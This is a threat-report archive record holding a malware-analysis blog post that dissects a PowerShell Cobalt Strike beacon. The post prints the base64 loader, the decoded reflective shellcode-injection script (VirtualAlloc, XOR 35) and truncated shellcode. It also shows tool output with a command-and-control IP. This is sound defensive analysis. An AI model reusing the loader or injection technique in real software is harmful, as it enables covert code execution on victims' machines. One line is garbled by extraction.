{
    "id": "deac5f68-0238-4604-9a95-f44382f93832",
    "created_at": "2023-01-12T15:08:34.334204Z",
    "updated_at": "2025-03-27T02:09:18.206974Z",
    "deleted_at": null,
    "sha1_hash": "799f74183a5f931e3275ef166d159b0f26e5bea1",
    "title": "2022-01-09 - Inspecting a PowerShell Cobalt Strike Beacon",
    "authors": "",
    "file_creation_date": "2022-05-28T05:06:53Z",
    "file_modification_date": "2022-05-28T05:06:53Z",
    "file_size": 114776,
    "plain_text": "# Inspecting a PowerShell Cobalt Strike Beacon\n\n**forensicitguy.github.io/inspecting-powershell-cobalt-strike-beacon/**\n\n#### By Tony Lambert Posted 2022-01-09 Updated 2022-03-28 7 min read\n\n\nJanuary 9, 2022\n\n\n#### In this post I want to take a look at a PowerShell-based Cobalt Strike beacon that appeared on MalwareBazaar. This particular beacon is representative of most PowerShell Cobalt Strike activity I see in the wild during my day job. The beacons often show up as service persistence during incidents or during other post-exploitation activity. If you want to follow along at home, the sample I’m using is here:\n\n https://bazaar.abuse.ch/sample/6881531ab756d62bdb0c3279040a5cbe92f9adfeccb201cca85b7d3cff7158d3/\n\n## Triaging the File\n\n#### Just like with other files, let’s approach with caution and verify the file is actually PowerShell. We can use file and head to do this.\n```\n  remnux@remnux:~/cases/cobaltstrike$ file payload.ps1 \n  payload.ps1: ASCII text, with very long lines\n  remnux@remnux:~/cases/cobaltstrike$ head -c 100\n  payload.ps1 \n  Set-StrictMode -Version 2\n  $DoIt = @'\n  ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkd\n  mFyX2\n\n We definitely have some PowerShell here. The cmdlet Set-StrictMode is a PowerShell feature used to enforce “scripting best practices.” In addition, the @' signals the use of a “here-string”, a string that may use multiple quotation mark literals and multiple lines of text. Now that we have a grasp of the file type, let’s take a look at the contents.\n\n## Inspecting the File Contents\n\n#### I personally love VSCode for inspecting code files, I know others typically get along with Sublime Editor as well. In this sample, we can observe:\n\n```\n\n-----\n\n```\n  Set-StrictMode -Version 2\n  $DoIt = @'\n  ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2R\n  lcm8p\n  '@\n  $aa1234 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($DoIt))\n  If ([IntPtr]::size -eq 8) {\n       start-job { param($a) IEX $a } -RunAs32 -Argument $aa1234 | wait-job | Receive-Job\n  }\n  else {\n       IEX $aa1234\n  }\n\n#### We can see the contents of $DoIt contain a decently-sized chunk of base64 text, but it’s likely not big enough to be a complete Windows EXE. The contents of the base64 string are decoded, converted to UTF-8 and then executed using a combination of Start-Job and InvokeExpression commands.\n\n To get our next step, let’s decode the base64 string manually using base64 -d . I’ve gone ahead and included the decoded code here:\n\n```\n\n-----\n\n```\n  function func_get_proc_address {\n       Param ($var_module, $var_procedure)\n       $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Lo\n       $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 's\n       return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.Handle\n  }\n  function func_get_delegate_type {\n       Param (\n           [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n           [Parameter(Position = 1)] [Type] $var_return_type = [Void]\n       )\n       $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedD\n       $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $\n       $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImple\n       return $var_type_builder.CreateType()\n  }\n  [Byte[]]$var_code =\n  [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHs\n  pxO')\n  for ($x = 0; $x -lt $var_code.Count; $x++) {\n       $var_code[$x] = $var_code[$x] -bxor 35\n  }\n  $var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc)\n  $var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n  [System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\n  $var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr\n\n#### There’s a LOT to unpack here and wrap our brains around. To keep this post short and sweet, there are two portions to focus upon:\n\n The contents of $var_code\n\n```\n\n-----\n\n#### e c u o code co ta g $ a _code[$ ] $ a _code[$ ] b o 35\n\n Suffice to say, the rest of the code is overhead required to inject shellcode reflectively into the memory space of the PowerShell process executing the script. If you’re curious about those portions, take a look into these keywords:\n\n GetProcAddress InMemoryModule ReflectedDelegate\n\n### Decoding the Shellcode\n\n#### The $var_code variable contains Cobalt Strike beacon shellcode that was XOR’d with the value 35 before being base64 encoded. We can decode all this PowerShell on any platform. I’m using the command pwsh to do this on REMnux.\n```\n  PS /home/remnux/cases/cobaltstrike> [Byte[]]$var_code =\n  [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHs\n  pxO')\n  PS /home/remnux/cases/cobaltstrike> for ($x = 0; $x -lt $var_code.Count; $x++) {\n  >> $var_code[$x] = $var_code[$x] -bxor 35\n  PS /home/remnux/cases/cobaltstrike> Set-Content -Path ./shellcode.bin -Value $var_code -AsByteStream\n\n Now we can take a look at the shellcode.bin file to get indicators. Also, the XOR with 35 is an indicator that the beacon is Cobalt Strike and not Metasploit or similar.\n\n## Getting Indicators from the Shellcode\n\n#### Let’s verify we have some functioning shellcode. We can do this with capa .\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/cobaltstrike$ capa -f sc32 shellcode.bin \n  +------------------------+-------------------------------------------------------------  ----+\n  | md5          | 63603bb6854a022e997a06fe7220a220               \n  |\n  | sha1          | ce72e661393227a1816e43159139860660118ccb           \n  |\n  | sha256         |\n  0a0dddca72464f3baa600be64e9f7da9c0cbe1126e8e713d0c9dba6ed231234a |\n  | path          | shellcode.bin                        \n  |\n  +------------------------+-------------------------------------------------------------  ----+\n  +------------------------+-------------------------------------------------------------  ----+\n  | ATT&CK Tactic     | ATT&CK Technique                       \n  |\n  |------------------------+-------------------------------------------------------------  ----|\n  | DEFENSE EVASION    | Virtualization/Sandbox Evasion::System Checks T1497.001   \n  |\n  | EXECUTION       | Shared Modules:: T1129                    \n  |\n  +------------------------+-------------------------------------------------------------  ----+\n  +-----------------------------+--------------------------------------------------------  ----+\n  | MBC Objective        | MBC Behavior                      \n  |\n  |-----------------------------+--------------------------------------------------------  ----|\n  | ANTI-BEHAVIORAL ANALYSIS  | Virtual Machine Detection::Instruction Testing\n  [B0009.029] |\n  +-----------------------------+--------------------------------------------------------  ----+\n  +------------------------------------------------------+-------------------------------  ----+\n  | CAPABILITY                      | NAMESPACE           \n  |\n  |------------------------------------------------------+-------------------------------  ----|\n  | execute anti-VM instructions             | anti-analysis/anti-vm/vm  detection |\n  | access PEB ldr_data                 | linking/runtime-linking    \n  |\n  | parse PE exports                   | load-code/pe          \n  |\n  +------------------------------------------------------+-------------------------------  ----+\n\n#### We definitely have some shellcode functionality here. The important part for me is the part about access PEB ldr data . This capability refers to the ability of the shellcode to resolve imports so it can use functions from DLLs. Shellcode doesn’t have an import table like standard Windows EXEs do, so it has to go the long way around to find all its needed functions.\n\n Since we’re pretty sure this is a Cobalt Strike we can get further indicators using a couple tools. The first and simplest is strings .\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/cobaltstrike$ strings shellcode.bin \n  ;}$u\n  D$$[[aYZQ\n  ]hnet\n  hwiniThLw&\n  WWWWWh:Vy\n  SPhW\n  RRRSRPh\n  SVh\n  hE!^1\n  QVPh\n  /rpc\n  Host: outlook.live.com\n  Accept: */*\n  User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like\n  Gecko)\n  pH<{\n  1o?/\n  %zKt\n  47.242.164[.]33\n\n#### We can see some elements in the strings that could appear in HTTP traffic. These details are:\n   47.242.164[.]33/rpc is likely the command and control address\n   User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) is a HTTP User-Agent string\n   Host: outlook.live.com and Accept: */* are HTTP header values\n\n Another good way to glean indicators is using 1768.py, a tool specifically designed to pull Cobalt Strike configuration details from beacons.\n\n```\n\n-----\n\n```\n  remnux@remnux:~/cases/cobaltstrike$ 1768.py --raw shellcode.bin \n  File: shellcode.bin\n  Probably found shellcode:\n  Parameter: 778 b'47.242.164.33'\n  license-id: 792 1359593325\n  push   :  190    8083 b'h\\x93\\x1f\\x00\\x00'\n  push   :  716    4096 b'h\\x00\\x10\\x00\\x00'\n  push   :  747    8192 b'h\\x00 \\x00\\x00'\n  String: 440 b'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like\n  Gecko)'\n  00000000: FC E8 89 00 00 00 60 89 E5 31 D2 64 8B 52 30 8B ......`..1.d.R0.\n  00000010: 52 0C 8B 52 14 8B 72 28 0F B7 4A 26 31 FF 31 C0 R..R..r(..J&1.1.\n  00000020: AC 3C 61 7C 02 2C 20 C1 CF 0D 01 C7 E2 F0 52 57 .<a|., .......RW\n  00000030: 8B 52 10 8B 42 3C 01 D0 8B 40 78 85 C0 74 4A 01 .R..B<...@x..tJ.\n  ...\n\n#### We have a little confirmation on indicators here, and we also got an additional one: a license ID. Cobalt Strike beacons are supposed to contain watermarks/license IDs that allow analysts to track a beacon back to one particular licensee. In this case, we see the value\n1359593325 . This value has been seen with loads of different activity in recent years from different groups.\n\n And that’s it for this post! If you’ve never seen a Cobalt Strike beacon before, this is probably the simplest version I’ve seen in a long time. Thank you for reading!\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-01-09 - Inspecting a PowerShell Cobalt Strike Beacon.pdf"
    ],
    "report_names": [
        "2022-01-09 - Inspecting a PowerShell Cobalt Strike Beacon.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536114,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653714413,
    "ts_modification_date": 1653714413,
    "files": {
        "pdf": "https://archive.orkl.eu/799f74183a5f931e3275ef166d159b0f26e5bea1.pdf",
        "text": "https://archive.orkl.eu/799f74183a5f931e3275ef166d159b0f26e5bea1.txt",
        "img": "https://archive.orkl.eu/799f74183a5f931e3275ef166d159b0f26e5bea1.jpg"
    }
}